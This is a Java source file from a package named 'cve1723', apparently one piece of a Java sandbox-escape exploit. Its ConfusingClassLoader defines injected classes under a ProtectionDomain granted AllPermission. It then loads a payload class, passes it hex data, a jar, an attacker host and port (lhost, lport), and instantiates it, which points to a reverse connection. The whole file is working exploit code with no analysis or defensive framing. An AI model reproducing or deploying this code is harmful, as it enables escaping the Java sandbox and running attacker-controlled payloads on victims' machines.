package cve1723;

import java.lang.reflect.Field;
import java.net.URL;
import java.security.*;
import java.security.cert.*;
import java.security.cert.Certificate;
import java.util.Enumeration;

/**
 * Call the protected method
 */
public class ConfusingClassLoader extends ClassLoader {

	public static void defineAndCreate(final ConfusingClassLoader cl, final String name[], final byte data[][], final String hexdata, final String jar, final String lhost, final int lport) {
		try {
			final Permissions p = new Permissions();
			p.add(new AllPermission());
			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(null, new Certificate[0]), p);

			final Class<?> clazz = cl.defineClass(name[0], data[0], 0, data[0].length, pd);
			cl.defineClass(name[1], data[1], 0, data[1].length, pd);

			final Field payload_data = clazz.getField("data");
			final Field payload_jar = clazz.getField("jar");
			final Field payload_lhost = clazz.getField("lhost");
			final Field payload_lport = clazz.getField("lport");

			payload_data.set(null, hexdata);
			payload_jar.set(null, jar);
			payload_lhost.set(null, lhost);
			payload_lport.set(null, lport);

			clazz.newInstance();
		} catch (final Exception e) {
			// swallow
			e.printStackTrace();
		}
	}
}
